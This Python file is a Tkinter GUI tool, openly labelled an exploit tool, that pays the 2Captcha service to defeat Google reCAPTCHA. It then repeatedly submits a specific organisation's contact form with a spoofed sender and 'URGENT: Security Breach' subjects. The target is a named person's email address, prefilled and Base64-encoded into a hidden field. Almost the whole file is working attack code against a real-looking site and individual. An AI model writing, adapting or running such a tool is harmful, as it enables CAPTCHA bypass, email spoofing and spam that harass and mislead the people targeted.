import requests
import time
import base64
import tkinter as tk
from tkinter import messagebox, scrolledtext
import threading
import logging

# -------------------------------------------------------------
# Logging Setup
# -------------------------------------------------------------
logger = logging.getLogger("WebsiteRateLimitChecker")
logger.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')

class TextHandler(logging.Handler):
    """
    Custom logging handler that writes logs to a Tkinter Text widget.
    """
    def __init__(self, text_widget):
        super().__init__()
        self.text_widget = text_widget

    def emit(self, record):
        msg = self.format(record)
        def append():
            self.text_widget.configure(state='normal')
            self.text_widget.insert(tk.END, msg + "\n")
            self.text_widget.configure(state='disabled')
            self.text_widget.yview(tk.END)
        self.text_widget.after(0, append)

# -------------------------------------------------------------
# CAPTCHA Solving Function using 2Captcha
# -------------------------------------------------------------
def solve_captcha(captcha_api_key, google_site_key, page_url):
    """
    Solves a reCAPTCHA challenge using the 2Captcha service.
    
    Parameters:
    - captcha_api_key: Your 2Captcha API key.
    - google_site_key: The site key for the reCAPTCHA on the target page.
    - page_url: The URL of the page where the CAPTCHA is located.
    
    Returns:
    - A string containing the CAPTCHA solution token, or None if solving failed.
    """
    logger.info("Requesting CAPTCHA solution from 2Captcha...")
    
    captcha_request_url = "http://2captcha.com/in.php"
    captcha_payload = {
        "key": captcha_api_key,
        "method": "userrecaptcha",
        "googlekey": google_site_key,  # Provided reCAPTCHA site key
        "pageurl": page_url,
        "json": 1
    }
    
    try:
        response = requests.post(captcha_request_url, data=captcha_payload).json()
    except Exception as e:
        logger.error(f"Error requesting CAPTCHA solution: {e}")
        return None

    # Check if the CAPTCHA request was accepted
    if response.get("status") != 1:
        logger.error("CAPTCHA request failed. Response: " + str(response))
        return None
    
    captcha_id = response.get("request")
    logger.info(f"CAPTCHA request accepted. ID: {captcha_id}. Waiting for solution...")
    
    # Wait for a period to allow CAPTCHA solving to begin
    time.sleep(15)
    
    captcha_result_url = f"http://2captcha.com/res.php?key={captcha_api_key}&action=get&id={captcha_id}&json=1"
    
    # Retry loop to fetch the solved CAPTCHA token
    for i in range(10):
        try:
            solution = requests.get(captcha_result_url).json()
        except Exception as e:
            logger.error(f"Error retrieving CAPTCHA solution: {e}")
            time.sleep(5)
            continue
        
        if solution.get("status") == 1:
            logger.info("CAPTCHA solved successfully!")
            return solution.get("request")
        else:
            logger.info("CAPTCHA not solved yet, retrying...")
            time.sleep(5)
    
    logger.error("Failed to retrieve CAPTCHA solution after multiple attempts.")
    return None

# -------------------------------------------------------------
# Function to Send Exploit Requests
# -------------------------------------------------------------
def send_exploit_requests(captcha_api_key, google_site_key, form_url, target_email, spoofed_email, num_attempts):
    """
    Sends spoofed email requests to the target form.
    
    Parameters:
    - captcha_api_key: 2Captcha API key for solving CAPTCHA challenges.
    - google_site_key: The reCAPTCHA site key for the target form.
    - form_url: The URL endpoint where the form is submitted.
    - target_email: The target email address (to be encoded in Base64).
    - spoofed_email: The email address to appear as the sender.
    - num_attempts: The number of spam attempts to perform.
    """
    # Solve the CAPTCHA challenge first
    captcha_token = solve_captcha(captcha_api_key, google_site_key, form_url)
    if not captcha_token:
        logger.error("Exiting: Could not solve CAPTCHA.")
        return
    
    # Encode the target email in Base64 for the hidden form field
    encoded_email = base64.b64encode(target_email.encode()).decode()
    
    # Loop for each spam attempt
    for attempt in range(1, num_attempts + 1):
        logger.info(f"Attempt {attempt}/{num_attempts}: Sending spoofed email request...")
        
        # Build the payload to mimic form submission
        data = {
            "person": "Domenic Laurenzi",  # Name in the form field
            "hiddenemail": encoded_email,  # Encoded target email
            "hiddentype": "psqapi",         # Arbitrary hidden field value
            "fullname": "Fake Admin",       # Displayed full name
            "email": spoofed_email,         # Spoofed sender email address
            "phone": "No",                  # Arbitrary phone field value
            "subject": f"URGENT: Security Breach {attempt}",  # Subject with attempt count
            "message": "This is a test. If you received this, the system is vulnerable to email spoofing.",  # Message body
            "g-recaptcha-response": captcha_token  # The solved CAPTCHA token
        }
        
        # Set HTTP headers to simulate a real browser request
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Referer": "https://des.ncsuvt.org/",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        try:
            response = requests.post(form_url, data=data, headers=headers)
            logger.info(f"Response Status Code: {response.status_code}")
            logger.info(f"Response Text (first 300 chars): {response.text[:300]}")
        except Exception as e:
            logger.error(f"Error sending request on attempt {attempt}: {e}")
        
        # Delay between each request to avoid overwhelming the server
        time.sleep(2)

# -------------------------------------------------------------
# GUI Class Definition
# -------------------------------------------------------------
class ExploitGUI:
    def __init__(self, master):
        self.master = master
        master.title("Website Rate Limit Checker - Exploit Tool")
        
        # 2Captcha API Key input
        tk.Label(master, text="2Captcha API Key:").grid(row=0, column=0, sticky='w', padx=5, pady=5)
        self.entry_api_key = tk.Entry(master, width=50)
        self.entry_api_key.grid(row=0, column=1, padx=5, pady=5)
        
        # Target Form URL input
        tk.Label(master, text="Target Form URL:").grid(row=1, column=0, sticky='w', padx=5, pady=5)
        self.entry_form_url = tk.Entry(master, width=50)
        self.entry_form_url.insert(0, "https://des.ncsuvt.org/sndreq/send_message.php")
        self.entry_form_url.grid(row=1, column=1, padx=5, pady=5)
        
        # Google reCAPTCHA Site Key input
        tk.Label(master, text="Google reCAPTCHA Site Key:").grid(row=2, column=0, sticky='w', padx=5, pady=5)
        self.entry_site_key = tk.Entry(master, width=50)
        self.entry_site_key.insert(0, "6LcggJAAAAA..._example")  # Replace with the actual site key
        self.entry_site_key.grid(row=2, column=1, padx=5, pady=5)
        
        # Target Email input
        tk.Label(master, text="Target Email:").grid(row=3, column=0, sticky='w', padx=5, pady=5)
        self.entry_target_email = tk.Entry(master, width=50)
        self.entry_target_email.insert(0, "domenic.laurenzi@ncsuvt.org")
        self.entry_target_email.grid(row=3, column=1, padx=5, pady=5)
        
        # Spoofed Email input
        tk.Label(master, text="Spoofed Email:").grid(row=4, column=0, sticky='w', padx=5, pady=5)
        self.entry_spoofed_email = tk.Entry(master, width=50)
        self.entry_spoofed_email.insert(0, "test@gmail.com")
        self.entry_spoofed_email.grid(row=4, column=1, padx=5, pady=5)
        
        # Number of Spam Attempts input
        tk.Label(master, text="Number of Spam Attempts:").grid(row=5, column=0, sticky='w', padx=5, pady=5)
        self.entry_attempts = tk.Entry(master, width=10)
        self.entry_attempts.insert(0, "5")
        self.entry_attempts.grid(row=5, column=1, padx=5, pady=5, sticky='w')
        
        # Button to start the exploit process
        self.start_button = tk.Button(master, text="Start Exploit", command=self.start_exploit)
        self.start_button.grid(row=6, column=0, columnspan=2, pady=10)
        
        # ScrolledText widget to display log output
        self.log_text = scrolledtext.ScrolledText(master, state='disabled', width=80, height=20)
        self.log_text.grid(row=7, column=0, columnspan=2, padx=5, pady=5)
        
        # Add the custom logging handler to display logs in the GUI
        text_handler = TextHandler(self.log_text)
        text_handler.setFormatter(formatter)
        logger.addHandler(text_handler)
    
    def start_exploit(self):
        """
        Collects user inputs, validates them, and starts the exploit process
        in a new thread so the GUI remains responsive.
        """
        captcha_api_key = self.entry_api_key.get().strip()
        form_url = self.entry_form_url.get().strip()
        google_site_key = self.entry_site_key.get().strip()
        target_email = self.entry_target_email.get().strip()
        spoofed_email = self.entry_spoofed_email.get().strip()
        
        try:
            num_attempts = int(self.entry_attempts.get().strip())
        except ValueError:
            messagebox.showerror("Input Error", "Number of spam attempts must be an integer.")
            return
        
        if not (captcha_api_key and form_url and google_site_key and target_email and spoofed_email):
            messagebox.showerror("Input Error", "All fields must be filled out.")
            return
        
        logger.info("Starting exploit process...")
        
        # Run the sending function in a separate thread to avoid blocking the GUI
        threading.Thread(
            target=send_exploit_requests,
            args=(captcha_api_key, google_site_key, form_url, target_email, spoofed_email, num_attempts),
            daemon=True
        ).start()

# -------------------------------------------------------------
# Main Application Entry Point
# -------------------------------------------------------------
if __name__ == "__main__":
    root = tk.Tk()
    app = ExploitGUI(root)
    root.mainloop()
